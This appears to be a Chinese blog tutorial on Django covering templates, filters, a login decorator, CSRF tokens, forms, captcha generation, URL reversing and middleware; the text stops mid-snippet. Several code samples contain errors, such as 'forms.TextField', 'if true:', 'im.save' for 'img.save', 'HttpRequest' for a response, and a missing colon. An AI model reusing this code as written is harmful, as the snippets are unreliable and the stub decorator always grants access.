<h3 id="模板标签"><a href="#模板标签" class="headerlink" title="模板标签"></a>模板标签</h3><p>后端给标签变量赋值可以使用render函数。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">render(request, <span class="string">&#x27;index.html&#x27;</span>, &#123;</span><br><span class="line">    <span class="string">&#x27;author_list&#x27;</span>: AuthorModel.objects.<span class="built_in">all</span>()</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<p>前端的模板标签主要如下</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">for循环标签</span><br><span class="line">&#123;% for x in author_list %&#125;</span><br><span class="line">列表不为空时</span><br><span class="line">&#123;&#123; forloop.counter &#125;&#125;  记录循环第几次</span><br><span class="line">&#123;% empty %&#125;</span><br><span class="line">列表为空时</span><br><span class="line">&#123;% endfor %&#125;</span><br><span class="line"></span><br><span class="line">if标签</span><br><span class="line">&#123;% if 条件 %&#125;</span><br><span class="line">操作符旁边必须有空格</span><br><span class="line">&#123;% elif %&#125;</span><br><span class="line">&#123;% else %&#125;</span><br><span class="line">&#123;% endif %&#125;</span><br><span class="line"></span><br><span class="line">注释</span><br><span class="line">&#123;# 单行注释 #&#125;</span><br><span class="line">&#123;% comment %&#125;</span><br><span class="line">多行注释</span><br><span class="line">&#123;% endcomment %&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="模板过滤器"><a href="#模板过滤器" class="headerlink" title="模板过滤器"></a>模板过滤器</h3><p>过滤器是用在前端的标签函数，用于对模板变量做操作。</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">过滤器格式为</span><br><span class="line">&#123;&#123; 变量|过滤器:参数 &#125;&#125;</span><br><span class="line">改变日期的显示格式</span><br><span class="line">&#123;&#123; book.publish_date|date:&quot;Y年-m月-d日&quot; &#125;&#125;</span><br><span class="line">求长度</span><br><span class="line">&#123;&#123; book.title|length &#125;&#125;</span><br><span class="line">设置默认值</span><br><span class="line">&#123;&#123; book.title|default:&quot;No Title&quot; &#125;&#125;</span><br><span class="line">自定义过滤器（是否是奇数）</span><br><span class="line">&#123;&#123; author.age|mod:1 &#125;&#125;</span><br></pre></td></tr></table></figure>

<p>自定义过滤器的定义应在my_app目录下的templatetags下。templatetags应该有一个<code>__init__.py</code>文件，保证该目录可以被Python识别。</p>
<p>这里创建一个<code>filters.py</code>文件用于开发自定义过滤器。自定义标签也可以写到这里。<br><code>filters.py</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> django <span class="keyword">import</span> template</span><br><span class="line">register = template.Library()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># value：被判断的变量；arg：传入的参数</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">mod</span>(<span class="params">value, arg</span>):</span><br><span class="line">    <span class="keyword">return</span> value % arg</span><br><span class="line"></span><br><span class="line"><span class="comment"># 完成后，注册过滤器</span></span><br><span class="line">register.<span class="built_in">filter</span>(<span class="string">&#x27;mod&#x27;</span>, mod)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 另外，只有一个参数的过滤器如下，外加另外一种注册方式</span></span><br><span class="line"><span class="meta">@register.filter(<span class="params">name=<span class="string">&#x27;lower&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">lower</span>(<span class="params">value</span>): <span class="comment"># Only one argument.</span></span><br><span class="line">    <span class="keyword">return</span> value.lower()</span><br></pre></td></tr></table></figure>

<p>在需要使用的模板上加载过滤器。</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">&#123;% load filters %&#125;</span><br></pre></td></tr></table></figure>

<h3 id="模板继承"><a href="#模板继承" class="headerlink" title="模板继承"></a>模板继承</h3><p>网页往往会有很多重复的内容，因此我们可以制作一个父页面，子页面继承主页面显示以减少重复代码。</p>
<p>父页面<code>base.html</code></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Title<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>Hello<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">&#123;% block topics %&#125;</span><br><span class="line">默认显示内容</span><br><span class="line">&#123;% endblock topics %&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>子页面<code>sub_page.html</code></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">&#123;% extends &#x27;base.html&#x27; %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% block topics %&#125;</span><br><span class="line">新内容</span><br><span class="line"></span><br><span class="line">获取父模板的内容</span><br><span class="line">&#123;&#123; block.super &#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;% endblock topics %&#125;</span><br></pre></td></tr></table></figure>

<h3 id="模板转义"><a href="#模板转义" class="headerlink" title="模板转义"></a>模板转义</h3><p>默认情况下，模板上下文（由后端传递过来）中的html标记会被转义显示，即模板中的<code>&lt;&gt;</code>会被转化为<code>&amp;lt;&amp;gt</code>。因此要关闭转义显示，可以使用标签</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">方式 1</span><br><span class="line">&#123;&#123; 变量|safe &#125;&#125;</span><br><span class="line"></span><br><span class="line">方式 2</span><br><span class="line">&#123;% autoescape off %&#125;</span><br><span class="line">模板语言代码</span><br><span class="line">&#123;% endautoescape %&#125;</span><br></pre></td></tr></table></figure>

<h2 id="Django-用户登录"><a href="#Django-用户登录" class="headerlink" title="Django 用户登录"></a>Django 用户登录</h2><h3 id="登录装饰器"><a href="#登录装饰器" class="headerlink" title="登录装饰器"></a>登录装饰器</h3><p>有些页面是用户登录之后才可以访问的，例如修改密码，修改昵称等，也就是这些页面首先要进行用户登录的判断，否则让用户跳转回登录页面。</p>
<p>我们可以通过函数装饰器的方式：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 定义一个闭包函数</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login_required</span>(<span class="params">view_func</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">wrapper</span>(<span class="params">request, *view_args, **view_kwargs</span>)</span><br><span class="line">        <span class="comment"># 判断用户是否登录</span></span><br><span class="line">        <span class="keyword">if</span> true:</span><br><span class="line">            <span class="keyword">return</span> view_func(request, *view_args, **view_kwargs)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> redirect(<span class="string">&#x27;/login&#x27;</span>)</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">return</span> wrapper</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用函数装饰器，使用该函数会先调用login_required，相当于</span></span><br><span class="line"><span class="comment"># login_required(change_pwd)(request, *view_args, **view_kwargs)</span></span><br><span class="line"><span class="meta">@login_required</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">change_pwd</span>(<span class="params">request</span>):</span><br><span class="line">    <span class="keyword">return</span> HttpResponse(<span class="string">&#x27;Change Password&#x27;</span>)</span><br></pre></td></tr></table></figure>


<h3 id="CSRF-攻击"><a href="#CSRF-攻击" class="headerlink" title="CSRF 攻击"></a>CSRF 攻击</h3><p>CSRF 攻击即跨站请求伪造攻击。我们在访问某一网站时，例如银行网站，在访问的结束后再去访问其他的网站，就会致使我们所有保存在浏览器上的数据包都会暴露给第三方网站，如果第三方网站上有某些攻击脚本，例如在用户不知情的情况下，再次利用刚才的数据包（SessionID）访问银行网站进行一些危险的操作，我们的数据就会产生泄露甚至丢失的危险。</p>
<p>由于伪造的网站与真实的网站的IP或主机名是不一样的，所以根据这一特性，我们可以也防止这种跨站请求伪造攻击。</p>
<p>Django 默认是启用这种 CSRF 攻击保护的（只针对POST），但同时也带来了不便，因为我们有时自己的网站也会被防护，导致自己的网站都无法正常浏览。</p>
<p>解决这一问题，可以在模板中的表单里添加如下内容即可。</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">&#123;% csrf_token %&#125;</span><br></pre></td></tr></table></figure>

<h3 id="内置表单"><a href="#内置表单" class="headerlink" title="内置表单"></a>内置表单</h3><p>Django中内置了表单。用户可以通过Django内置的表单生成器自动生成表单。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> django <span class="keyword">import</span> forms</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">LoginForm</span>(forms.Form):</span><br><span class="line">    username = forms.TextField()</span><br><span class="line">    password = forms.TextField(widget=forms.PasswordInput)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login_handler</span>(<span class="params">request</span>):</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&quot;POST&quot;</span>:</span><br><span class="line">        login_form = LoginForm(request.POST)</span><br><span class="line">        <span class="keyword">if</span> login_form.is_valid():</span><br><span class="line">            user = login_form.cleaned_data[<span class="string">&#x27;username&#x27;</span>]</span><br><span class="line">            pswd = login_form.cleaned_data[<span class="string">&#x27;password&#x27;</span>]</span><br><span class="line">            <span class="keyword">if</span> user:</span><br><span class="line">                <span class="comment"># 验证用户名，密码</span></span><br><span class="line">                <span class="keyword">return</span> HttpResponse(<span class="string">&#x27;成功登录&#x27;</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">return</span> HttpResponse(<span class="string">&#x27;登录失败&#x27;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> HttpResponse(<span class="string">&quot;输入不合法&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>(<span class="params">request</span>):</span><br><span class="line">    login_form = LoginForm()</span><br><span class="line">    <span class="keyword">return</span> render(request,<span class="string">&#x27;login.html&#x27;</span>, &#123;<span class="string">&quot;forms&quot;</span>:login_form&#125;)</span><br></pre></td></tr></table></figure>

<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;.&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span>&gt;</span></span><br><span class="line">    &#123;% csrf_token %&#125;</span><br><span class="line">    &#123;&#123; forms &#125;&#125;</span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Login&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="验证码"><a href="#验证码" class="headerlink" title="验证码"></a>验证码</h3><p><a href="https://django-simple-captcha.readthedocs.io/en/latest/">django-simple-captcha 官方文档</a><br>首先按照验证码库：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">pip install django-simple-captcha</span><br></pre></td></tr></table></figure>

<p>在项目settings.py中配置：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">INSTALLED_APPS = [</span><br><span class="line">     ...</span><br><span class="line">    <span class="string">&quot;captcha&quot;</span>,</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="comment"># Captcha 二者选其一</span></span><br><span class="line"><span class="comment"># 字母验证码</span></span><br><span class="line">CAPTCHA_IMAGE_SIZE = (<span class="number">80</span>, <span class="number">45</span>)   <span class="comment"># 设置 captcha 图片大小</span></span><br><span class="line">CAPTCHA_LENGTH = <span class="number">4</span>   <span class="comment"># 字符个数</span></span><br><span class="line">CAPTCHA_TIMEOUT = <span class="number">1</span>   <span class="comment"># 超时(minutes)</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="comment"># 加减乘除验证码</span></span><br><span class="line">CAPTCHA_OUTPUT_FORMAT = <span class="string">&#x27;%(image)s %(text_field)s %(hidden_field)s &#x27;</span></span><br><span class="line">CAPTCHA_NOISE_FUNCTIONS = (<span class="string">&#x27;captcha.helpers.noise_null&#x27;</span>, </span><br><span class="line">     <span class="string">&#x27;captcha.helpers.noise_arcs&#x27;</span>, <span class="comment"># 线</span></span><br><span class="line">     <span class="string">&#x27;captcha.helpers.noise_dots&#x27;</span>, <span class="comment"># 点</span></span><br><span class="line">)</span><br><span class="line">CAPTCHA_CHALLENGE_FUNCT = <span class="string">&#x27;captcha.helpers.random_char_challenge&#x27;</span></span><br><span class="line">CAPTCHA_CHALLENGE_FUNCT = <span class="string">&#x27;captcha.helpers.math_challenge&#x27;</span></span><br><span class="line">CAPTCHA_TIMEOUT = <span class="number">1</span></span><br></pre></td></tr></table></figure>

<p>在项目urls.py中配置：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">path(<span class="string">&#x27;captcha/&#x27;</span>, include(<span class="string">&#x27;captcha.urls&#x27;</span>))</span><br></pre></td></tr></table></figure>

<p>完成后迁移数据库</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">python manage.py makemigration</span><br><span class="line">python manage.py migrate</span><br></pre></td></tr></table></figure>

<p>创建登录表单，验证码在登录时由表单自动完成验证。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> django <span class="keyword">import</span> forms</span><br><span class="line"><span class="keyword">from</span> captcha.fields <span class="keyword">import</span> CaptchaField</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">LoginForm</span>(forms.Form):</span><br><span class="line">    username = forms.TextField()</span><br><span class="line">    password = forms.TextField(widget=forms.PasswordInput)</span><br><span class="line">    captcha = CaptchaField()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login_handler</span>(<span class="params">request</span>):</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&quot;POST&quot;</span>:</span><br><span class="line">        login_form = LoginForm(request.POST)</span><br><span class="line">        <span class="keyword">if</span> login_form.is_valid():</span><br><span class="line">            user = login_form.username</span><br><span class="line">            <span class="keyword">if</span> user:</span><br><span class="line">                <span class="string">&#x27;&#x27;&#x27;用户登陆后，Django会自动调用默认的session应用，将用户的id存至session中&#x27;&#x27;&#x27;</span></span><br><span class="line">                <span class="keyword">return</span> HttpResponse(<span class="string">&#x27;成功登录&#x27;</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">return</span> HttpResponse(<span class="string">&#x27;登录失败&#x27;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> HttpResponse(<span class="string">&quot;输入不合法&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>(<span class="params">request</span>):</span><br><span class="line">    login_form = LoginForm()</span><br><span class="line">    <span class="keyword">return</span> render(request,<span class="string">&#x27;login.html&#x27;</span>, &#123;<span class="string">&quot;forms&quot;</span>:login_form&#125;)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>如果想要点击验证码实现验证码更新，则可以使用如下操作（需要jQuery）。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> captcha.helpers <span class="keyword">import</span> captcha_image_url</span><br><span class="line"><span class="keyword">from</span> captcha.models <span class="keyword">import</span> CaptchaStore</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">captcha_refresh</span>(<span class="params">request</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;  Return json with new captcha for ajax refresh request &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> request.is_ajax():  <span class="comment"># 只接受ajax提交</span></span><br><span class="line">        <span class="keyword">raise</span> Http404</span><br><span class="line">    new_key = CaptchaStore.generate_key()</span><br><span class="line">    to_json_response = &#123;</span><br><span class="line">        <span class="string">&#x27;key&#x27;</span>: new_key,</span><br><span class="line">        <span class="string">&#x27;image_url&#x27;</span>: captcha_image_url(new_key),</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> HttpResponse(json.dumps(to_json_response), content_type=<span class="string">&#x27;application/json&#x27;</span>)</span><br></pre></td></tr></table></figure>

<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-handlebars"><span class="language-xml"></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">    $(function()&#123;</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">    # 改变鼠标箭头</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">    $(&#x27;.captcha&#x27;).css(&#123;</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">        &#x27;cursor&#x27;: &#x27;pointer&#x27;</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">    &#125;)</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">    # ajax 刷新</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">    $(&#x27;.captcha&#x27;).click(function()&#123;</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">        console.log(&#x27;click&#x27;);</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">         $.getJSON(&quot;/captcha/refresh/&quot;,</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">                  function(result)&#123;</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">             $(&#x27;.captcha&#x27;).attr(&#x27;src&#x27;, result[&#x27;image_url&#x27;]);</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">             $(&#x27;#id_captcha_0&#x27;).val(result[&#x27;key&#x27;])</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">          &#125;);&#125;);</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">    # ajax动态验证</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">    $(&#x27;#id_captcha_1&#x27;).blur(function()&#123; // #id_captcha_1为输入框的id，当该输入框失去焦点是触发函数</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">        json_data=&#123;</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">            &#x27;response&#x27;:$(&#x27;#id_captcha_1&#x27;).val(),  // 获取输入框和隐藏字段id_captcha_0的数值</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">            &#x27;hashkey&#x27;:$(&#x27;#id_captcha_0&#x27;).val()</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">        &#125;</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">        $.getJSON(&#x27;/ajax_val&#x27;, json_data, function(data)&#123; //ajax发送            $(&#x27;#captcha_status&#x27;).remove()</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">            if(data[&#x27;status&#x27;])&#123; //status返回1为验证码正确， status返回0为验证码错误， 在输入框的后面写入提示信息</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">                $(&#x27;#id_captcha_1&#x27;).after(&#x27;<span class="tag">&lt;<span class="name">span</span> <span class="attr">id</span>=<span class="string">&quot;captcha_status&quot;</span> &gt;</span>*验证码正确<span class="tag">&lt;/<span class="name">span</span>&gt;</span>&#x27;)</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">            &#125;else&#123;</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">                 $(&#x27;#id_captcha_1&#x27;).after(&#x27;<span class="tag">&lt;<span class="name">span</span> <span class="attr">id</span>=<span class="string">&quot;captcha_status&quot;</span> &gt;</span>*验证码错误<span class="tag">&lt;/<span class="name">span</span>&gt;</span>&#x27;)</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">            &#125;</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">        &#125;);</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">    &#125;);</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">    &#125;)</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars"></span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span> </span><br></pre></td></tr></table></figure>


<p>当然，高级玩家可以自己画验证码。<br>下面自制验证码：</p>
<p>安装Pillow包</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">pip install Pillow</span><br></pre></td></tr></table></figure>

<p>定义一个验证码生成函数</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image, ImageDraw, ImageFont</span><br><span class="line"><span class="keyword">from</span> django.utils.six <span class="keyword">import</span> BytesIO</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">verify_code</span>(<span class="params">request</span>):</span><br><span class="line">    <span class="keyword">import</span> random</span><br><span class="line">    <span class="comment"># 背景色，宽，高</span></span><br><span class="line">    bgcolor = (random.randrange(<span class="number">20</span>, <span class="number">100</span>), random.randrange(<span class="number">20</span>, <span class="number">100</span>), <span class="number">255</span>)</span><br><span class="line">    width = <span class="number">100</span></span><br><span class="line">    height = <span class="number">25</span></span><br><span class="line">    <span class="comment"># 创建画面</span></span><br><span class="line">    img = Image.new(<span class="string">&#x27;RGB&#x27;</span>, (width, height), bgcolor)</span><br><span class="line">    draw = ImageDraw.Draw(img)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 绘制噪点</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">100</span>):</span><br><span class="line">        xy = (random.randrange(<span class="number">0</span>, width), random.randrange(<span class="number">0</span>, height))</span><br><span class="line">        fill = (random.randrange(<span class="number">0</span>, <span class="number">255</span>), <span class="number">255</span>, random.randrange(<span class="number">0</span>, <span class="number">255</span>))</span><br><span class="line">        draw.point(xy, fill=fill)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 准备字符串</span></span><br><span class="line">    str_back = <span class="string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890&#x27;</span></span><br><span class="line">    rand_str = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">4</span>):</span><br><span class="line">        rand_str += str_back[random.randrange(<span class="number">0</span>, <span class="built_in">len</span>(str_back))]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 绘制字符串</span></span><br><span class="line">    font = ImageFont.truetype(<span class="string">&#x27;FreeMono.ttf&#x27;</span>, <span class="number">23</span>)</span><br><span class="line">    fontcolor = (<span class="number">255</span>, random.randrange(<span class="number">0</span>, <span class="number">255</span>), random.randrange(<span class="number">0</span>,<span class="number">255</span>))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">4</span>):</span><br><span class="line">        draw.text((<span class="number">5</span> + <span class="number">24</span>*i, <span class="number">2</span>), rand_str[i], font=font, fill=fontcolor)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 释放画笔</span></span><br><span class="line">    <span class="keyword">del</span> draw</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 存储验证码到后端</span></span><br><span class="line">    request.session[<span class="string">&#x27;verify_code&#x27;</span>] = rand_str</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 保存到内存文件</span></span><br><span class="line">    buf = BytesIO()</span><br><span class="line">    im.save(buf, <span class="string">&#x27;png&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 返回验证码</span></span><br><span class="line">    <span class="keyword">return</span> HttpResponse(buf.getvalue(), <span class="string">&#x27;image/png&#x27;</span>)</span><br></pre></td></tr></table></figure>

<h3 id="URL-反向解析"><a href="#URL-反向解析" class="headerlink" title="URL 反向解析"></a>URL 反向解析</h3><p>在模板里面，可以将链接到其他页面的超链接写成动态的，这样可以保证修改链接后自动修改所有链接到某页的路径。</p>
<p>在项目urls.py中，添加namespace属性：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">url_patterns = [</span><br><span class="line">    ...</span><br><span class="line">    path(<span class="string">&#x27;my_app/&#x27;</span>, include(<span class="string">&#x27;my_app.urls&#x27;</span>, namespace=<span class="string">&#x27;my_app&#x27;</span>))</span><br><span class="line">]</span><br></pre></td></tr></table></figure>

<p>在应用urls.py配置中，添加name属性：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">url_patterns = [</span><br><span class="line">    ...</span><br><span class="line">    path(<span class="string">&#x27;index_renamed/&#x27;</span>, views.index, name=<span class="string">&#x27;index&#x27;</span>)</span><br><span class="line">]</span><br></pre></td></tr></table></figure>

<p>在模板中：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">用法：url &#x27;namespace:name&#x27; 参数</span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;&#123;% url &#x27;my_app:index&#x27; %&#125;&quot;</span>&gt;</span>首页<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;&#123;% url &#x27;my_app:index&#x27; arg1 arg2 %&#125;&quot;</span>&gt;</span>带位置参数的首页<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;&#123;% url &#x27;my_app:index&#x27; a=arg1 b=arg2 %&#125;&quot;</span>&gt;</span>带关键字参数的首页<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>在视图中使用反向解析：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> django.core.urlresolvers <span class="keyword">import</span> reverse</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">test_redirect</span>(<span class="params">request</span>):</span><br><span class="line">    <span class="comment"># &#x27;namespace:name&#x27;</span></span><br><span class="line">    url = reverse(<span class="string">&#x27;my_app:index&#x27;</span>, args=(<span class="string">&#x27;arg1&#x27;</span>, <span class="string">&#x27;arg2&#x27;</span>))</span><br><span class="line">    url = reverse(<span class="string">&#x27;my_app:index&#x27;</span>, kwargs=&#123;<span class="string">&#x27;a&#x27;</span>=<span class="string">&#x27;arg1&#x27;</span>, <span class="string">&#x27;b&#x27;</span>=<span class="string">&#x27;arg2&#x27;</span>&#125;)</span><br><span class="line">    <span class="keyword">return</span> redirect(url)</span><br></pre></td></tr></table></figure>
<h3 id="中间件"><a href="#中间件" class="headerlink" title="中间件"></a>中间件</h3><p>是Django预留的函数接口，允许我们干预请求和应答。例如对客户端进行过滤，防止DDoS攻击等。</p>
<p>中间件可以允许我们在执行视图函数之前自动执行中间件。中间件的执行流程如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">st=&gt;start: 请求到达服务器</span><br><span class="line">op1=&gt;operation: 产生Request对象</span><br><span class="line">op2=&gt;operation: 调用process_request</span><br><span class="line">op3=&gt;operation: 匹配URL</span><br><span class="line">op4=&gt;operation: 调用process_view</span><br><span class="line">op5=&gt;operation: 调用视图函数</span><br><span class="line">op6=&gt;operation: 调用process_response</span><br><span class="line">op6=&gt;operation: 返回给浏览器</span><br><span class="line">e=&gt;end</span><br><span class="line"></span><br><span class="line">st-&gt;op1-&gt;op2-&gt;op3-&gt;op4-&gt;op5-&gt;op6-&gt;e</span><br></pre></td></tr></table></figure>

<p>在setting.py中注册中间件，注册顺序与执行顺序相反。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">MIDDLEWARE = [</span><br><span class="line">    ...</span><br><span class="line">    <span class="string">&#x27;my_app.middleware.Block_Middleware&#x27;</span></span><br><span class="line">]</span><br></pre></td></tr></table></figure>

<p>在my_app目录下建立<code>middleware.py</code>文件，编辑此文件：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 中间件类</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Block_Middleware</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="comment"># 匹配url之后，在进入视图函数之前调用</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">process_view</span>(<span class="params">self, request, view_func, *view_args, **view_kwargs</span>):</span><br><span class="line">        <span class="comment"># 获取浏览器端的IP地址：</span></span><br><span class="line">        user_ip = request.META(<span class="string">&#x27;REMOTE_ADDR&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> user_ip <span class="keyword">in</span> [<span class="string">&#x27;127.0.0.1&#x27;</span>]:</span><br><span class="line">            <span class="keyword">return</span> HttpRequest(<span class="string">&#x27;Go Back&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 服务器启动后接受第一个请求的时候调用</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">pass</span></span><br><span 